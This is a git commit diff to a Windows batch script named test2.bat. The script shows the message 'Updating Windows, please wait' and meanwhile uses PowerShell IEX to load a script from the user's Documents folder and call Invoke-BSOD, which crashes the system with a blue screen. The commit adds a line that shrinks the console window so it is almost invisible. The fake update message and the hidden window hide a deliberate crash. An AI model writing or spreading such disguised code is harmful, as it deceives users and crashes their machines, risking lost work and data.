822f12d2216b440a7015567d3c5ca271ecfe6d98
SSBhaumik <36877365+SSBhaumik@users.noreply.github.com>
2022-01-30 23:46:53 +0530

    Update test2.bat

--- test2.bat
+++ test2.bat
@@ -1,3 +1,4 @@
 @echo off
+mode con: cols=15 lines=1
 echo Updating Windows, please wait
 powershell IEX((New-Object Net.Webclient).DownloadString('"%userprofile%\Documents\bh3oub0b.ps1"'));Invoke-BSOD
